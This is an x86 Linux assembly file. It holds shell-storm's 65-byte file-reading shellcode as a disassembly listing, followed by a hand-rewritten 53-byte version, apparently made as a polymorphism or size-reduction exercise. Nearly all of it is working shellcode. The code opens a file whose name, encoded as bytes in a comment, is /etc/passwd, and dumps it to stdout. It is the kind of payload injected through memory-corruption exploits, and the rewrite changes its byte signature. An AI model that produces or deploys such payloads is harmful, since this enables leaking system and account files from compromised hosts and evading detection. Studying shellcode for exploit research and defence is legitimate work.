;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Original shellcode                                       ;
; http://shell-storm.org/shellcode/files/shellcode-73.php ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Original shellcode code (Ndisasm)                        ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; 00000000  31C0              xor eax,eax                  ;
; 00000002  31DB              xor ebx,ebx                  ;
; 00000004  31C9              xor ecx,ecx                  ;
; 00000006  31D2              xor edx,edx                  ;
; 00000008  EB32              jmp short 0x3c               ;
; 0000000A  5B                pop ebx                      ;
; 0000000B  B005              mov al,0x5                   ;
; 0000000D  31C9              xor ecx,ecx                  ;
; 0000000F  CD80              int 0x80                     ;
; 00000011  89C6              mov esi,eax                  ;
; 00000013  EB06              jmp short 0x1b               ;
; 00000015  B001              mov al,0x1                   ;
; 00000017  31DB              xor ebx,ebx                  ;
; 00000019  CD80              int 0x80                     ;
; 0000001B  89F3              mov ebx,esi                  ;
; 0000001D  B003              mov al,0x3                   ;
; 0000001F  83EC01            sub esp,byte +0x1            ;
; 00000022  8D0C24            lea ecx,[esp]                ;
; 00000025  B201              mov dl,0x1                   ;
; 00000027  CD80              int 0x80                     ;
; 00000029  31DB              xor ebx,ebx                  ;
; 0000002B  39C3              cmp ebx,eax                  ;
; 0000002D  74E6              jz 0x15                      ;
; 0000002F  B004              mov al,0x4                   ;
; 00000031  B301              mov bl,0x1                   ;
; 00000033  B201              mov dl,0x1                   ;
; 00000035  CD80              int 0x80                     ;
; 00000037  83C401            add esp,byte +0x1            ;
; 0000003A  EBDF              jmp short 0x1b               ;
; 0000003C  E8C9FFFFFF        call 0xa                     ;
; .string "file_name"                                      ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Size = 65 Bytes                                          ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; New version                                              ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global _start

_start:
	xor ecx, ecx           ; initialize ecx
	mul ecx                ; initialize eax, edx

	jmp short _call        ; start Jump Call Pop
_pop:
	mov ebx, [esp]	       ; recover filename (equivalent to pop ebx)

	add al, 0x6
	dec al                 ; 0x5 open() syscall number

	int 0x80               ; call syscall

	xchg ebx, eax          ; assign file handle to ebx

	mov esi, ebx           ; copy file handle to esi

	xchg eax, ecx          ; exchange ecx and eax values (eax = 0)

	mov ecx, esp           ; our *buffer

	inc edx                ; read file byte by byte

	inc eax                ; eax = 1           
_read_chunk:
	add al, 0x2            ; 0x3 read() syscall number	

	int 0x80               ; call syscall

	cmp eax, edx           ; check if eax is equal to edx

	jne _exit              ; if not equal we've probably reached the EOF

	add al, 0x3            ; 0x4 write() syscall number

	mov ebx, edx           ; edx = 1 so ebx = 1 = stdout file descriptor number

	int 0x80               ; call syscall

	mov ebx, esi           ; restore opened file descriptor (handle)

	jmp short _read_chunk  ; read next chunk	
_exit:
	mov al, dl             ; edx = 0x1 so eax = 0x1 = exit() syscall
	dec edx                ; edx = 0
	xchg ebx, edx          ; ebx = 0	

	int 0x80               ; call syscall
_call:
	call _pop
	; filename: db 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64
	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Size = 53 Bytes                                          ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
